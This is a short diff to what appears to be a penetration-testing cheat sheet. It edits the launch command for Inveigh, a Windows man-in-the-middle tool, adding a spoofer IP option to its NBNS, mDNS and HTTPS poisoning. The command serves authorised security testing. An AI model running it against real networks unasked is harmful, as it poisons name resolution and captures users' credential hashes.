@@ -5,7 +5,7 @@
 ## inveigh - launch
 #plateform/windows #target/remote #cat/ATTACK/MITM 
 ```
-Invoke-Inveigh -ConsoleOutput Y -NBNS Y -mDNS Y -HTTPS Y -Proxy Y -IP <ip>
+Invoke-Inveigh -ConsoleOutput Y -NBNS Y -mDNS Y -HTTPS Y -Proxy Y -IP <listening_ip> -SpooferIP <redirect_ip>
 ```
 
 ## inveigh - clear hashtable
